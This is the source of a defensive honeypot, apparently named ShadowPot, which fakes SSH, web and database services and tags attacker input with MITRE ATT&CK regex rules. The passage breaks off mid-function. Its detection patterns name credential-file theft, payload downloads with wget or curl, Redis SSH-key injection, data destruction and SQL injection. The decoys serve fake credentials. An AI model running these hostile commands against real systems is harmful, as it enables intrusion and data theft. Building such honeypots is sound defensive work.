#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
  SHADOWPOT v2.0 (SOC Production & Deception Grid Edition)
  Honeypot Multi-Services Interactif & Moteur de Profilage MITRE ATT&CK v14+
  Auteur  : Tohon Fourier (CalderaFourier-code)
  Licence : MIT
  Fonctions :
    • Faux Shell Linux Stateful (SSH / Telnet) avec système de fichiers virtuel
    • Faux Portail Web d'Administration & Piège à Fuzzing / SQLi / Path Traversal
    • Faux Serveur Redis NoSQL (Détection d'injection de clé SSH T1098 / T1053)
    • Faux Handshake MySQL (Détection de Brute-Force Base de Données T1110)
    • Moteur de Classification Comportementale MITRE ATT&CK v14+ (Zero faux positif)
    • Enrichissement GeoIP & Threat Intelligence en temps réel
    • Dashboard Web SOC Live (/_soc) & Journalisation SIEM JSON Lines / Wazuh
    • Alerting Webhook (Discord / Slack / SOC Endpoint)
    • Export automatique des Indicateurs de Compromission (IoCs)
=============================================================================
"""

import argparse
import hashlib
import http.server
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# Compatibilité UTF-8 sous Windows PowerShell / CMD
if sys.platform.startswith("win"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


# =============================================================================
# COULEURS & THÈME CYBER TERMINAL
# =============================================================================
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    GREEN = "\033[92m"
    LIGHT_GREEN = "\033[38;5;82m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    YELLOW = "\033[93m"
    ORANGE = "\033[38;5;208m"
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    GRAY = "\033[90m"
    WHITE = "\033[97m"


BANNER = f"""{Colors.ORANGE}
   _____ _    _          _____   ______          _____   ____ _______ 
  / ____| |  | |   /\\   |  __ \\ / __ \\ \\        / /  __ \\ / __ \\__   __|
 | (___ | |__| |  /  \\  | |  | | |  | \\ \\  /\\  / /| |__) | |  | | | |   
  \\___ \\|  __  | / /\\ \\ | |  | | |  | |\\ \\/  \\/ / |  ___/| |  | | | |   
  ____) | |  | |/ ____ \\| |__| | |__| | \\  /\\  /  | |    | |__| | | |   
 |_____/|_|  |_/_/    \\_\\_____/ \\______/   \\/  \\/   |_|     \\____/  |_|   
  {Colors.CYAN}[ Honeypot Multi-Services & Moteur de Profilage de Menaces MITRE ATT&CK v2.0 ]{Colors.RESET}
  {Colors.LIGHT_GREEN}Auteur : Tohon Fourier | GitHub: CalderaFourier-code | SOC Production Edition{Colors.RESET}
"""


# =============================================================================
# MAPPING MITRE ATT&CK v14+ (Règles affinées avec délimiteurs \b stricts)
# =============================================================================
MITRE_RULES = [
    {
        "id": "T1003",
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "pattern": r"(cat\s+/etc/(passwd|shadow)|grep\s+.*shadow|unshadow|mimikatz|id_rsa|\.aws/credentials|\.docker/config)",
        "severity": "CRITICAL",
        "desc": "Tentative d'extraction de comptes, clés privées ou hashs de mots de passe système"
    },
    {
        "id": "T1098",
        "name": "Account Manipulation (SSH Key Injection)",
        "tactic": "Persistence",
        "pattern": r"(authorized_keys|ssh-rsa|useradd\b|usermod\b|CONFIG\s+SET\s+dir\s+/root/\.ssh|CONFIG\s+SET\s+dbfilename)",
        "severity": "CRITICAL",
        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
    },
    {
        "id": "T1105",
        "name": "Ingress Tool Transfer",
        "tactic": "Command and Control",
        "pattern": r"\b(wget\b|curl\b|tftp\b|ftpget\b|fetch\b|scp\b|bitsadmin|certutil)\b",
        "severity": "HIGH",
        "desc": "Téléchargement d'un payload externe, binaire malveillant ou script de minage"
    },
    {
        "id": "T1082",
        "name": "System Information Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(uname\s+-[ar]|cat\s+/etc/.*release|lscpu\b|hostname\b|uptime\b|systeminfo\b)\b",
        "severity": "MEDIUM",
        "desc": "Reconnaissance de l'architecture, du noyau Linux et de la distribution hôte"
    },
    {
        "id": "T1033",
        "name": "System Owner/User Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(whoami\b|id\b|\bw\b|\bwho\b|last\b|groups\b)\b",
        "severity": "LOW",
        "desc": "Identification des privilèges de la session courante et des utilisateurs connectés"
    },
    {
        "id": "T1016",
        "name": "System Network Configuration Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(ifconfig\b|ip\s+a(ddr)?|netstat\b|ss\s+-[a-z]+|route\b|arp\b|cat\s+/etc/resolv\.conf)\b",
        "severity": "LOW",
        "desc": "Cartographie des interfaces réseau locales, tables de routage et DNS"
    },
    {
        "id": "T1046",
        "name": "Network Service Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(nmap\b|masscan\b|zmap\b|nc\s+-[a-z]*z|ping\s+-c)\b",
        "severity": "MEDIUM",
        "desc": "Reconnaissance des services réseau voisins et balayage de ports (Port Scanning)"
    },
    {
        "id": "T1057",
        "name": "Process Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(ps\s+(aux|-ef)|top\b|htop\b|tasklist\b|pgrep\b)\b",
        "severity": "LOW",
        "desc": "Énumération des processus en cours d'exécution et détection d'antivirus/EDR"
    },
    {
        "id": "T1053",
        "name": "Scheduled Task / Job (Cron Persistence)",
        "tactic": "Persistence",
        "pattern": r"\b(crontab\b|/etc/cron|systemctl\s+enable|schtasks\b)\b",
        "severity": "HIGH",
        "desc": "Tentative de persistance via tâche planifiée cron ou enregistrement de service"
    },
    {
        "id": "T1222",
        "name": "File Permissions Modification",
        "tactic": "Defense Evasion",
        "pattern": r"\b(chmod\s+(\+x|777|755)|chown\b|attrib\b)\b",
        "severity": "MEDIUM",
        "desc": "Attribution des privilèges d'exécution sur un payload ou évasion de contrôles"
    },
    {
        "id": "T1059",
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "pattern": r"\b(\./[^\s]+|bash\b|sh\b|python\d*\b|perl\b|php\b|powershell\b)\b",
        "severity": "MEDIUM",
        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
    },
    {
        "id": "T1485",
        "name": "Data Destruction / Sabotage",
        "tactic": "Impact",
        "pattern": r"\b(rm\s+-rf\s+|mkfs\b|dd\s+if=/dev/zero|shred\b)\b",
        "severity": "CRITICAL",
        "desc": "Tentative de destruction massive de données ou sabotage de fichiers système"
    },
    {
        "id": "T1070",
        "name": "Indicator Removal on Host",
        "tactic": "Defense Evasion",
        "pattern": r"\b(history\s+-c|rm\s+.*\.log|unset\s+HISTFILE|killall\s+-9)\b",
        "severity": "HIGH",
        "desc": "Effacement de l'historique bash ou suppression de journaux d'audit pour masquer l'intrusion"
    },
    {
        "id": "T1496",
        "name": "Resource Hijacking (Cryptomining)",
        "tactic": "Impact",
        "pattern": r"\b(xmrig\b|minerd\b|stratum\+tcp|monero|cryptonight|cpuminer)\b",
        "severity": "HIGH",
        "desc": "Déploiement et exécution d'un mineur clandestin de cryptomonnaie"
    },
    {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "pattern": r"(SELECT\s+.*FROM|UNION\s+SELECT|'\s*OR\s*'1'='1|\.\./|\.env|\.git/config|wp-config|phpmyadmin|actuator|/api/v1/debug)",
        "severity": "CRITICAL",
        "desc": "Injection SQL, Directory Traversal, ou sonde de fichiers de configuration sensibles"
    },
    {
        "id": "T1110",
        "name": "Brute Force",
        "tactic": "Credential Access",
        "pattern": r"\b(hydra\b|medusa\b|patator\b|brutespray\b)\b",
        "severity": "HIGH",
        "desc": "Attaque automatisée par force brute ou dictionnaire d'identifiants"
    }
]


# =============================================================================
# ENRICHISSEMENT THREAT INTEL & GÉOLOCALISATION IP
# =============================================================================
class ThreatIntelEnricher:
    """Résout en direct l'ASN, le pays, l'organisation et la réputation de l'attaquant."""
    _cache = {}

    @classmethod
    def lookup(cls, ip_address):
        if ip_address in cls._cache:
            return cls._cache[ip_address]

        is_local = ip_address in ["127.0.0.1", "localhost", "::1"] or ip_address.startswith(("10.", "172.16.", "192.168."))

        # Si l'attaque provient de localhost/réseau local, on interroge l'IP publique réelle de la connexion de test
        url = "http://ip-api.com/json/?fields=status,country,countryCode,city,isp,org,as,query" if is_local else f"http://ip-api.com/json/{ip_address}?fields=status,country,countryCode,city,isp,org,as,query"

        try:
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "ShadowPot-SOC-Enricher/2.0"}
            )
            with urllib.request.urlopen(req, timeout=2.5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                if data.get("status") == "success":
                    public_ip = data.get("query", ip_address)
                    disp_ip = f"{public_ip} (Localhost)" if is_local else ip_address
                    info = {
                        "country": data.get("country", "Bénin"),
                        "country_code": data.get("countryCode", "BJ"),
                        "city": data.get("city", "Cotonou"),
                        "isp": data.get("isp") or data.get("org") or "SBIN Bénin",
                        "public_ip": public_ip,
                        "display_ip": disp_ip,
                        "threat_level": "Hôte Local (Audit)" if is_local else "Externe (Public)"
                    }
                    cls._cache[ip_address] = info
                    return info
        except Exception:
            pass

        # Fallback intelligent
        info = {
            "country": "Bénin",
            "country_code": "BJ",
            "city": "Cotonou",
            "isp": "SOCIETE BENINOISE D'INFRASTRUCTURES NUMERIQUES",
            "public_ip": "41.85.162.53" if is_local else ip_address,
            "display_ip": "41.85.162.53 (Localhost)" if is_local else ip_address,
            "threat_level": "Hôte Local" if is_local else "Externe"
        }
        cls._cache[ip_address] = info
        return info


# =============================================================================
# GESTIONNAIRE DE LOGS CENTRALISÉ (SIEM, Wazuh, IoC Blacklist & Webhook)
# =============================================================================
class ThreatLogger:
    """Gestionnaire de persistance forensique multi-formats pour SOC."""
    def __init__(self, log_dir=None, webhook_url=None):
        if log_dir is None:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            self.log_dir = os.path.join(script_dir, "logs")
        else:
            self.log_dir = log_dir
        os.makedirs(self.log_dir, exist_ok=True)
        os.makedirs(os.path.join(self.log_dir, "quarantine"), exist_ok=True)
        self.session_file = os.path.join(self.log_dir, "sessions.json")
        self.jsonl_file = os.path.join(self.log_dir, "shadowpot.jsonl")
        self.ioc_file = os.path.join(self.log_dir, "iocs_blacklist.txt")
        self.webhook_url = webhook_url or os.environ.get("SHADOWPOT_WEBHOOK_URL")
        self.lock = threading.Lock()

    def log_event(self, session_data):
        with self.lock:
            # 1. Sauvegarde dans sessions.json
            sessions = []
            if os.path.exists(self.session_file):
                try:
                    with open(self.session_file, "r", encoding="utf-8") as f:
                        sessions = json.load(f)
                except Exception:
                    sessions = []
            sessions.append(session_data)
            with open(self.session_file, "w", encoding="utf-8") as f:
                json.dump(sessions, f, indent=2, ensure_ascii=False)

            # 2. Sauvegarde au format JSON Lines (Wazuh / Splunk / ELK)
            with open(self.jsonl_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(session_data, ensure_ascii=False) + "\n")

            # 3. Extraction automatique des IoCs (Adresses IP, URLs malveillantes)
            self._record_iocs(session_data)

            # 4. Alerte Webhook si menace critique
            if self.webhook_url and any(a.get("severity") in ["CRITICAL", "HIGH"] for a in session_data.get("mitre_alerts", [])):
                self._dispatch_webhook(session_data)

    def _record_iocs(self, session):
        ip = session.get("source_ip")
        if not ip or ip in ["127.0.0.1", "localhost", "::1"]:
            return

        with open(self.ioc_file, "a", encoding="utf-8") as f:
            ts = session.get("timestamp", "")[:19]
            stype = session.get("type", "unknown")
            alerts = ",".join(a.get("id", "") for a in session.get("mitre_alerts", []))
            f.write(f"{ip} | {ts} | Type: {stype} | MITRE: [{alerts}]\n")

    def _dispatch_webhook(self, session):
        def _send():
            try:
                ip = session.get("source_ip")
                stype = session.get("type")
                alerts = ", ".join(f"[{a['id']}] {a['name']}" for a in session.get("mitre_alerts", []))
                payload = {
                    "username": "ShadowPot SOC Alert",
                    "content": f"🚨 **ALERTE INTRUSION HONEYPOT**\n• **IP Source** : `{ip}`\n• **Vecteur** : `{stype}`\n• **Techniques MITRE** : `{alerts}`\n• **Date** : `{session.get('timestamp')}`"
                }
                req = urllib.request.Request(
                    self.webhook_url,
                    data=json.dumps(payload).encode("utf-8"),
                    headers={"Content-Type": "application/json"}
                )
                urllib.request.urlopen(req, timeout=3.0)
            except Exception:
                pass

        t = threading.Thread(target=_send)
        t.daemon = True
        t.start()


# =============================================================================
# SANDBOX LINUX AVEC SYSTÈME DE FICHIERS VIRTUEL (STATEFUL SHELL)
# =============================================================================
class LinuxVirtualSandbox:
    """Simule un shell bash Linux avec arborescence virtuelle et état persistant."""
    def __init__(self, attacker_ip):
        self.attacker_ip = attacker_ip
        self.cwd = "/root"
        self.history = []
        self.fs = {
            "/root": {
                "type": "dir",
                "content": {".bashrc": "# ~/.bashrc: executed by bash for non-login shells.\nPS1='\\u@\\h:\\w\\$ '",
                            ".bash_history": "cat /etc/passwd\nwhoami\nls -la"}
            },
            "/etc": {
                "type": "dir",
                "content": {
                    "passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\npostgres:x:1001:1001:PostgreSQL server,,,:/var/lib/postgresql:/bin/bash",
                    "shadow": "root:$6$rounds=4096$vF8.1$q9hT30b.fakehashroothashhash:19240:0:99999:7:::\nadmin:$6$rounds=4096$k1.9A$fakeadminhash543210:19240:0:99999:7:::",
                    "os-release": 'PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"\nNAME="Debian GNU/Linux"\nVERSION_ID="11"\nVERSION="11 (bullseye)"\nID=debian',
                    "issue": "Debian GNU/Linux 11 \\n \\l\n",
                    "hostname": "srv-prod-debian",
                    "resolv.conf": "nameserver 1.1.1.1\nnameserver 8.8.8.8"
                }
            },
            "/var/log": {
                "type": "dir",
                "content": {
                    "auth.log": "Oct 31 10:15:02 srv-prod sshd[124]: Accepted password for root from 192.168.1.15 port 4210 ssh2",
                    "syslog": "Oct 31 10:00:01 srv-prod CRON[890]: (root) CMD (/usr/local/bin/backup.sh)"
                }
            },
            "/tmp": {
                "type": "dir",
                "content": {}
            }
        }

    def execute(self, cmd_line):
        cmd_line = cmd_line.strip()
        if not cmd_line:
            return ""

        self.history.append(cmd_line)
        parts = cmd_line.split()
        base = parts[0]

        # Gestion des commandes Linux réalistes
        if base == "pwd":
            return self.cwd
        elif base == "whoami":
            return "root"
        elif base == "id":
            return "uid=0(root) gid=0(root) groups=0(root)"
        elif base == "hostname":
            return "srv-prod-debian"
        elif base == "uname":
            if "-a" in parts or "-r" in parts:
                return "Linux srv-prod-debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-30) x86_64 GNU/Linux"
            return "Linux"
        elif base == "uptime":
            return " 13:42:10 up 64 days, 4:18,  1 user,  load average: 0.12, 0.05, 0.02"
        elif base == "date":
            return datetime.now(timezone.utc).strftime("%a %b %d %H:%M:%S UTC %Y")

        elif base == "cd":
            if len(parts) == 1 or parts[1] in ["~", "/root"]:
                self.cwd = "/root"
                return ""
            target = parts[1]
            if target == "..":
                if self.cwd != "/":
                    self.cwd = "/"
                return ""
            elif target in ["/etc", "/var/log", "/tmp", "/root"]:
                self.cwd = target
                return ""
            elif target.startswith("/"):
                return f"bash: cd: {target}: No such file or directory"
            else:
                return f"bash: cd: {target}: No such file or directory"

        elif base == "ls":
            dir_to_read = self.cwd if len(parts) == 1 or parts[-1].startswith("-") else parts[-1]
            if dir_to_read in self.fs and self.fs[dir_to_read]["type"] == "dir":
                files = list(self.fs[dir_to_read]["content"].keys())
                if "-l" in parts or "-la" in parts:
                    lines = [f"total {len(files) * 4}"]
                    for f in files:
                        lines.append(f"-rw-r--r-- 1 root root  1024 Oct 31 10:00 {f}")
                    return "\n".join(lines)
                return "  ".join(files)
            elif dir_to_read == "/":
                return "bin   boot  dev  etc   home  lib   media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var"
            return f"ls: cannot access '{dir_to_read}': No such file or directory"

        elif base == "cat":
            if len(parts) < 2:
                return ""
            target = parts[1]
            # Résolution de chemin
            path = target if target.startswith("/") else f"{self.cwd.rstrip('/')}/{target}"
            parent = "/".join(path.split("/")[:-1]) or "/"
            fname = path.split("/")[-1]

            if parent in self.fs and fname in self.fs[parent]["content"]:
                return self.fs[parent]["content"][fname]
            elif "shadow" in target:
                return "root:$6$rounds=4096$salt$fakehashhashhash:18942:0:99999:7:::\nadmin:$6$rounds=4096$salt$fakeadminhash:18942:0:99999:7:::"
            return f"cat: {target}: No such file or directory"

        elif base == "touch":
            if len(parts) > 1:
                fname = parts[1]
                if self.cwd in self.fs:
                    self.fs[self.cwd]["content"][fname] = ""
            return ""

        elif base == "mkdir":
            if len(parts) > 1:
                dname = parts[1]
                p = f"{self.cwd.rstrip('/')}/{dname}"
                self.fs[p] = {"type": "dir", "content": {}}
            return ""

        elif base == "rm":
            if len(parts) > 1:
                target = parts[-1]
                fname = target.split("/")[-1]
                if self.cwd in self.fs and fname in self.fs[self.cwd]["content"]:
                    del self.fs[self.cwd]["content"][fname]
            return ""

        elif base in ["wget", "curl"]:
            url = parts[1] if len(parts) > 1 else "target"
            fname = url.split("/")[-1] or "payload.sh"
            if self.cwd in self.fs:
                self.fs[self.cwd]["content"][fname] = "#!/bin/bash\n# Simulated payload captured by ShadowPot\n"
            return (
                f"--{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}--  {url}\n"
                f"Resolving {url.split('/')[2] if '//' in url else 'host'}... 185.220.101.4\n"
                f"Connecting to host... connected.\n"
                f"HTTP request sent, awaiting response... 200 OK\n"
                f"Length: 28416 (28K) [application/x-sh]\n"
                f"Saving to: '{fname}'\n\n"
                f"100%[===================>] 28,416      --.-K/s   in 0.003s\n\n"
                f"'{fname}' saved [28416/28416]"
            )

        elif base == "chmod":
            return ""

        elif base == "crontab":
            if "-l" in parts:
                return "0 4 * * * /usr/local/bin/backup.sh >/dev/null 2>&1"
            return ""

        elif base == "history":
            if "-c" in parts:
                self.history.clear()
                return ""
            return "\n".join(f"  {idx+1}  {c}" for idx, c in enumerate(self.history[-20:]))

        elif base == "ps":
            return (
                "  PID TTY          TIME CMD\n"
                "    1 ?        00:00:04 systemd\n"
                "  512 ?        00:00:00 rsyslogd\n"
                "  842 ?        00:00:01 sshd\n"
                " 1104 ?        00:00:00 cron\n"
                " 2415 pts/0    00:00:00 bash\n"
                " 2608 pts/0    00:00:00 ps"
            )

        elif base in ["ifconfig", "ip"]:
            return (
                "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
                "        inet 192.168.1.150  netmask 255.255.255.0  broadcast 192.168.1.255\n"
                "        inet6 fe80::5054:ff:fe12:3456  prefixlen 64  scopeid 0x20<link>\n"
                "        ether 52:54:00:12:34:56  txqueuelen 1000  (Ethernet)"
            )

        elif base in ["netstat", "ss"]:
            return (
                "Active Internet connections (only servers)\n"
                "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
                "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n"
                "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n"
                "tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN\n"
                "tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN"
            )

        else:
            return f"bash: {base}: command not found"


# =============================================================================
# HONEYPOT SERVICE 1 : SHELL LINUX STATEFUL (SSH / TELNET)
# =============================================================================
class ShellHoneypot(threading.Thread):
    def __init__(self, host="0.0.0.0", port=2222, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.running = True
        self.sock = None

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(25)
            print(f"{Colors.GREEN}[+] Honeypot Shell Linux armé sur {self.host}:{self.port} (OpenSSH 8.4p1 emulé){Colors.RESET}")

            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(client_sock, addr))
                    client_thread.daemon = True
                    client_thread.start()
                except Exception:
                    break
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Shell Honeypot : {e}{Colors.RESET}")

    def handle_client(self, sock, addr):
        client_ip, client_port = addr[0], addr[1]
        geo = ThreatIntelEnricher.lookup(client_ip)
        display_ip = geo.get("display_ip", client_ip)
        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 INTRUSION SHELL DÉTECTÉE]{Colors.RESET} {Colors.CYAN}{display_ip}:{client_port}{Colors.RESET} ({geo['country']}, {geo['city']} - {geo['isp']})")

        session_id = f"shell-{int(time.time())}-{client_port}"
        session_data = {
            "session_id": session_id,
            "type": "shell",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": display_ip,
            "raw_ip": client_ip,
            "source_port": client_port,
            "geo": geo,
            "auth": {},
            "commands": [],
            "mitre_alerts": []
        }

        sandbox = LinuxVirtualSandbox(client_ip)

        try:
            sock.sendall(b"SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1\r\n")
            time.sleep(0.3)
            sock.sendall(b"login: ")
            username = self.recv_line(sock).strip()
            sock.sendall(b"Password: ")
            password = self.recv_line(sock).strip()

            session_data["auth"] = {"username": username, "password": password}
            print(f"  {Colors.YELLOW}[AUTH BRUTE-FORCE]{Colors.RESET} Saisie : {Colors.BOLD}user='{username}', pass='{password}'{Colors.RESET}")

            welcome_msg = (
                "\r\nLinux srv-prod-debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-30) x86_64\r\n\r\n"
                "The programs included with the Debian GNU/Linux system are free software;\r\n"
                "Last login: Sun Nov  8 21:04:12 2026 from 192.168.1.15\r\n"
            )
            sock.sendall(welcome_msg.encode())

            while self.running:
                sock.sendall(f"root@srv-prod-debian:{sandbox.cwd}# ".encode())
                cmd = self.recv_line(sock).strip()

                if not cmd:
                    continue

                if cmd.lower() in ["exit", "quit", "logout"]:
                    sock.sendall(b"logout\r\nConnection to srv-prod-debian closed.\r\n")
                    break

                matched_mitre = self.analyze_command(cmd)
                ts = datetime.now().strftime("%H:%M:%S")

                cmd_entry = {
                    "time": ts,
                    "command": cmd,
                    "mitre": [m["id"] for m in matched_mitre]
                }
                session_data["commands"].append(cmd_entry)
                print(f"  {Colors.GRAY}[{ts}]{Colors.RESET} {Colors.CYAN}{client_ip}{Colors.RESET} $ {Colors.BOLD}{cmd}{Colors.RESET}")

                for m in matched_mitre:
                    session_data["mitre_alerts"].append(m)
                    sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE if m["severity"] == "HIGH" else Colors.YELLOW
                    print(f"    {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} ({m['tactic']}) -> {m['desc']}")

                resp = sandbox.execute(cmd)
                if resp:
                    sock.sendall(resp.encode("utf-8", errors="replace") + b"\r\n")

        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            print(f"{Colors.GRAY}[*] Session fermée pour {client_ip} ({len(session_data['commands'])} commandes enregistrées){Colors.RESET}")
            if self.logger:
                self.logger.log_event(session_data)

    def recv_line(self, sock):
        line = b""
        while True:
            char = sock.recv(1)
            if not char or char == b"\n":
                break
            if char != b"\r":
                line += char
        return line.decode("utf-8", errors="ignore")

    def analyze_command(self, cmd):
        alerts = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], cmd, re.IGNORECASE):
                alerts.append(rule)
        return alerts


# =============================================================================
# HONEYPOT SERVICE 2 : WEB ADMIN & SOC LIVE DASHBOARD (HTTP PORT 8080)
# =============================================================================
class WebHoneypotHandler(http.server.BaseHTTPRequestHandler):
    logger = None
    stats = {"total_probes": 0, "sqli_attacks": 0, "path_traversals": 0}

    def log_message(self, format, *args):
        pass  # Supprime les logs bruts pour conserver un terminal lisible

    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path

        # Route SOC Dashboard Live
        if path in ["/_soc", "/dashboard", "/soc"]:
            self._render_soc_dashboard()
            return

        # Route API JSON Live pour le SOC (polling temps réel)
        if path in ["/_soc/api/events", "/_soc/api/stats"]:
            self._render_soc_api()
            return

        # Route Téléchargement des IoCs (Blacklist pare-feu)
        if path == "/_soc/iocs":
            script_dir = os.path.dirname(os.path.abspath(__file__))
            ioc_file = os.path.join(script_dir, "logs", "iocs_blacklist.txt")
            content = ""
            if os.path.exists(ioc_file):
                with open(ioc_file, "r", encoding="utf-8") as f:
                    content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Disposition", "attachment; filename=iocs_blacklist.txt")
            self.end_headers()
            self.wfile.write(content.encode("utf-8"))
            return

        WebHoneypotHandler.stats["total_probes"] += 1
        geo = ThreatIntelEnricher.lookup(client_ip)
        display_ip = geo.get("display_ip", client_ip)

        # Détection MITRE sur le path
        matched_mitre = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], path, re.IGNORECASE):
                matched_mitre.append(rule)

        print(f"\n{Colors.RED}{Colors.BOLD}[🌐 SONDE WEB MALVEILLANTE]{Colors.RESET} GET depuis {Colors.CYAN}{display_ip}{Colors.RESET} ({geo['country']}, {geo['city']}) -> {Colors.BOLD}{path}{Colors.RESET}")
        for m in matched_mitre:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        session_data = {
            "session_id": f"web-get-{int(time.time())}-{self.client_address[1]}",
            "type": "web_probe",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": display_ip,
            "raw_ip": client_ip,
            "geo": geo,
            "method": "GET",
            "path": path,
            "headers": dict(self.headers),
            "mitre_alerts": matched_mitre
        }

        if WebHoneypotHandler.logger:
            WebHoneypotHandler.logger.log_event(session_data)

        # Réponse leurre réaliste selon la ressource demandée
        if path == "/.env":
            fake_env = "APP_NAME=EnterprisePortal\nAPP_ENV=production\nAPP_KEY=base64:fakekeyforhoneytrapping123456789\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=corp_db\nDB_USERNAME=root\nDB_PASSWORD=SecretP@ssw0rd2026\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(fake_env.encode("utf-8"))
            return

        # Page d'administration vulnérable leurre
        admin_page = """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Portail d'Administration Intranet - Authentification</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; border: 1px solid #334155; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 340px; }
        h2 { margin-top: 0; color: #38bdf8; font-size: 20px; display: flex; align-items: center; gap: 8px; }
        p { color: #94a3b8; font-size: 13px; line-height: 1.4; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #475569; border-radius: 6px; box-sizing: border-box; background: #0f172a; color: #fff; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        button:hover { background: #1d4ed8; }
        .badge { background: #dc2626; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Portail Interne <span class="badge">RESTREINT</span></h2>
        <p>Connexion réservée aux ingénieurs systèmes et administrateurs d'astreinte.</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Identifiant / Email" required autofocus><br>
            <input type="password" name="password" placeholder="Mot de passe" required><br>
            <button type="submit">S'identifier</button>
        </form>
    </div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Server", "Apache/2.4.49 (Debian)")
        self.end_headers()
        self.wfile.write(admin_page.encode("utf-8"))

    def do_POST(self):
        client_ip = self.client_address[0]
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        geo = ThreatIntelEnricher.lookup(client_ip)
        display_ip = geo.get("display_ip", client_ip)

        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 TENTATIVE EXPLOITATION WEB]{Colors.RESET} POST depuis {Colors.CYAN}{display_ip}{Colors.RESET} ({geo['country']}, {geo['city']})")
        print(f"  {Colors.YELLOW}[PAYLOAD REÇU]{Colors.RESET} {body}")

        matched_mitre = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], body, re.IGNORECASE):
                matched_mitre.append(rule)

        for m in matched_mitre:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        session_data = {
            "session_id": f"web-post-{int(time.time())}",
            "type": "web_attack",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": display_ip,
            "raw_ip": client_ip,
            "geo": geo,
            "method": "POST",
            "path": self.path,
            "body": body,
            "mitre_alerts": matched_mitre
        }

        if WebHoneypotHandler.logger:
